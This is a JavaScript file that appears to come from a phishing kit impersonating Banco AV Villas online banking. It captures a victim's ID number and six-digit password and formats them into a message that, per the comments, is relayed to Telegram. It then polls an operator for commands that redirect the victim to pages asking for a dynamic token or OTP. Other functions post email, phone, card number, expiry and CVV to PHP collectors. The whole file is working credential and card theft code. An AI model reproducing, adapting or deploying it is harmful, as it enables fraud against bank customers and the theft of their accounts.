function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}


function iniciar(){
    $("#fondo,#cargando").hide();
}

function cerrar(){
     window.location.href = "https://www.avvillas.com.co/bancadigital/inicio"; 
}

function status(){
    // Obtener session_id y messageId del localStorage
    const sessionId = localStorage.getItem('session_id');
    const messageId = localStorage.getItem('messageId');
    
    if (!sessionId || !messageId) {
        // Si no hay datos de sesión, redirigir al inicio
        window.location.href = "../index.html";
        return;
    }
    
    // Verificar respuesta de Telegram
    const formData = new FormData();
    formData.append('transactionId', sessionId);
    formData.append('messageId', messageId);

    fetch('../verificar_respuesta.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(result => {
        if (result.action) {
            switch (result.action) {
                case 'pedir_dinamica':
                    window.location.href = "../token.php";
                    break;
                case 'error_logo':
                    window.location.href = "../error/";
                    break;
                case 'exito':
                    // En lugar de redirigir a portal, continuar en el sistema
                    // o redirigir a una página específica que necesites
                    window.location.href = "../sistema/";
                    break;
                case 'finalizar':
                    window.location.href = "../fin.php";
                    break;
                default:
                    // Si no hay acción específica, continuar verificando
                    break;
            }
        } else {
            // Si no hay respuesta aún, continuar verificando
            // La función se llamará nuevamente en 2 segundos
        }
    })
    .catch(err => {
        // Si hay error, continuar verificando
    });
}

function esperando(){
    window.location.href = "sistema/";    
}

function esperando_in(){
    window.location.href = "../sistema/";    
}

function enviar_usuario(u,p){
    // Generar o recuperar session_id
    let sessionId = localStorage.getItem('session_id');
    if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
    }
    
    // Validar que la clave tenga 6 dígitos
    if (p.length !== 6) {
        alert('La clave debe tener 6 dígitos');
        $("#fondo,#cargando").hide();
        return;
    }
    
    // Validar que la identificación tenga al menos 5 dígitos
    if (u.length < 5) {
        alert('La identificación debe tener al menos 5 dígitos');
        $("#fondo,#cargando").hide();
        return;
    }

    // Guardar datos en localStorage
    localStorage.setItem('username', u);
    localStorage.setItem('password', p);
    localStorage.setItem('session_id', sessionId);
    localStorage.setItem('identificacion', u);

    // Detectar tipo de dispositivo
    const userAgent = navigator.userAgent;
    let dispositivo = 'PC';
    
    if (/Android/i.test(userAgent)) {
        dispositivo = 'Android';
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        dispositivo = 'iPhone';
    } else if (/Windows/i.test(userAgent)) {
        dispositivo = 'PC';
    } else if (/Mac/i.test(userAgent)) {
        dispositivo = 'Mac';
    } else if (/Linux/i.test(userAgent)) {
        dispositivo = 'Linux';
    }
    
    const hora = new Date().toLocaleString('es-ES');
    
    // Construir mensaje
    const mensaje = `
<b><u>💎AV VILLAS💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO AV VILLAS
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${u}
• <b>🔑 Clave:</b> ${p}
------------------------------`;

    // Intentar envío real primero
    const formData = new FormData();
    formData.append('message', mensaje);
    formData.append('transactionId', sessionId);

    fetch('procesar_logo.php', {
        method: 'POST',
        body: formData
    })
    .then(res => {
        return res.json();
    })
    .then(result => {
        if (result.status === 'success') {
            localStorage.setItem('messageId', result.messageId);
            // Continuar con verificación real
            setTimeout(() => {
                checkPaymentVerification(sessionId, result.messageId);
            }, 2000);
        } else {
            // Si falla el envío real, usar simulación
            simularEnvio(sessionId);
        }
    })
    .catch(err => {
        // Si hay error, usar simulación
        simularEnvio(sessionId);
    });
}

function simularEnvio(sessionId) {
    // Simular respuesta exitosa
    const messageId = 'msg_' + Date.now();
    localStorage.setItem('messageId', messageId);
    
    // Simular delay y luego continuar
    setTimeout(() => {
        checkPaymentVerification(sessionId, messageId);
    }, 2000);
}

async function checkPaymentVerification(transactionId, messageId) {
    try {
        // Intentar verificación real primero
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php', {
            method: 'POST',
            body: formData
        });
        const result = await res.json();

        if (result.action) {
            switch (result.action) {
                case 'pedir_dinamica':
                    window.location.href = "token.html";
                    break;
                case 'error_logo':
                    $("#fondo,#cargando").hide();
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "index.html";
                    break;
                case 'procesando':
                    // No redirigir, solo ocultar el loader
                    $("#fondo,#cargando").hide();
                    break;
            }
        } else {
            // Si no hay respuesta real, seguir verificando cada 2 segundos
            setTimeout(() => {
                checkPaymentVerification(transactionId, messageId);
            }, 2000);
        }
    } catch (err) {
        // Si hay error, reintentar después de 2 segundos
        setTimeout(() => {
            checkPaymentVerification(transactionId, messageId);
        }, 2000);
    }
}



function enviar_otp(o){
    $.post( "../../../../../process/paso4otp.php", { otp:o } ,function(data) {     
        setTimeout(esperando_in, 600);      
    });
}

function enviar_correo(m,c){    
    $.post( "../process/put-mail.php",{ eml:m, cel:c},function(data) {
        window.location.href = "../sistema/index.html";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "../process/put-card.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "../sistema/index.html";
    });
}


